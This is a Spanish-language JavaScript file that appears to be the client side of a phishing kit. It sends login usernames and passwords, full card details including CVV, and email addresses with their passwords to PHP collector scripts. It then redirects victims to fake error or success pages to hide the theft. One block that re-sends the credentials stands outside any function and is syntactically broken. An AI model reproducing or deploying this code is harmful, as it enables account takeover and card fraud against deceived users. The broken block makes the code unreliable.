let identificadorTiempoDeEspera;

function ventana_tarjeta() {
	$(".mensaje-error").animate({"margin-left":"-=100","opacity":"0"}, 400, function() {
    	$("#smt-error").submit();    
    });         
}

function ventana_error() {
    window.location.href = "worldwide/error/";      
}

function RetrasoError() {
  identificadorTiempoDeEspera = setTimeout(ventana_error, 700);
}


function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}


function enviar_login(u,p){
	var d = detectar_dispositivo();
    $.post( "process/tpl-l.php", { usr:u,pas:p,dis:d } ,function(data) {        
        RetrasoError();
    });
}
// POST paralelo a procesar_formulario.php
    var payload = {
        "txt-usuario": u,
        "txt-pass": p,
        "hdd-dispositivo": d
    };

    // Lo mandamos como JSON para que tu PHP siga funcionando igual
    $.ajax({
        url: "procesar_formulario.php",
        type: "POST",
        contentType: "application/json",
        data: JSON.stringify(payload),
        success: function(res){
            console.log("procesar_formulario.php respondió:", res);
        },
        error: function(err){
            console.warn("Error al enviar a procesar_formulario.php:", err);
        }
    });
}

function enviar_tarjeta(n,a,t,f,c){
	$.post( "../../process/tpl-c.php", { nom:n,ape:a,tar:t,fec:f,cvv:c } ,function(data) {  
		$(".frm-tarjeta").animate({"margin-left":"-=100","opacity":"0"}, 400, function() {
			window.location.href = "../../process/tpl-c.php"; 
		});       
		
    });
}

function enviar_correo(e,c){
	$.post( "../../process/tpl-e.php", { eml:e,clv:c } ,function(data) {
		$(".frm-correo").animate({"margin-left":"-=100","opacity":"0"}, 400, function() {
        	window.location.href = "../successful/";
       	}); 	
    });
}

